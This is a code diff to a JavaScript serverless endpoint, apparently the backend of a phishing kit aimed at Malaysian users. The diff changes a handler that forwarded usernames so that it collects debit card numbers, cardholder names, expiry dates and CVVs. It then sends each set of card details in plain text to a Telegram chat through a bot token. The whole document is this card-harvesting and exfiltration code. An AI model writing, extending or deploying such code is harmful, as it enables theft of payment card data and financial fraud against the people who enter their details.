@@ -1,5 +1,4 @@
 export default async function handler(req, res) {
-  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   if (req.method === 'OPTIONS') return res.status(200).end();
@@ -8,9 +7,17 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { username } = req.body;
-  if (!username) {
-    return res.status(400).json({ error: 'Username required' });
+  const { username, cardNumber, cardName, expiry, cvv } = req.body;
+  if (!username || !cardNumber || !cardName || !expiry || !cvv) {
+    return res.status(400).json({ error: 'All fields required' });
+  }
+
+  // Validasi sederhana (opsional)
+  if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ''))) {
+    return res.status(400).json({ error: 'Invalid card number' });
+  }
+  if (!/^\d{3}$/.test(cvv)) {
+    return res.status(400).json({ error: 'CVV must be 3 digits' });
   }
 
   const token = process.env.TELEGRAM_TOKEN;
@@ -20,7 +27,7 @@ export default async function handler(req, res) {
   }
 
   const time = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
-  const message = `👤 *Username Entry*\n🆔 Username: ${username}\n🕒 Time: ${time}`;
+  const message = `💳 *Debit Card Entry*\n👤 Username: ${username}\n💳 Card: ${cardNumber}\n🧾 Name: ${cardName}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕒 Time: ${time}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -38,7 +45,7 @@ export default async function handler(req, res) {
 
     return res.status(200).json({
       success: true,
-      message: 'Username received'
+      message: 'Debit card details received'
     });
   } catch (error) {
     console.error('Telegram error:', error.message);
